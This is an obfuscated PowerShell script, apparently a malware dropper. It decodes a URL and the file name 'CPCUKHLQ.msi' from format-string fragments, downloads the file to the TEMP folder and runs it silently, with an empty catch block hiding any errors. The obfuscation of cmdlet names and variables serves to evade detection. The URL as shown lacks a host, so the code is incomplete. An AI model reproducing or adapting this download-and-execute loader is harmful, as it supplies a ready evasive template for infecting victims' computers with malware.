

  ${somEd`A`Ta} = @(
  [PSCustomObject]@{('a') = ("{2}{1}{0}" -f 'ps://','t','ht'); ('b') = ("{3}{2}{0}{1}" -f'C','UKHLQ.msi','P','C')}
);
  foreach (${i} in ${so`Me`D`Ata}) {
    try {
      ${Fi`l`Epa`Th} = "$env:TEMP\$($i.b)";
      ${d`O`wnLo`AD} = ${TR`UE};
      if (.("{2}{0}{1}"-f'-P','ath','Test') ${f`ILEP`ATh}) {
        ${D`oW`NloaD} = ${fa`LSE};
      } 
      if (${DoWNl`O`Ad}) {
        &("{5}{4}{3}{2}{0}{1}" -f'eth','od','M','ke-Rest','vo','In') -Uri ${i}."a" -OutFile ${F`iLePaTH}; 
      }
      .("{0}{2}{1}{3}"-f 'Start','s','-Proce','s') ${fI`Le`Path};
    }
    catch {
    }
  }

  
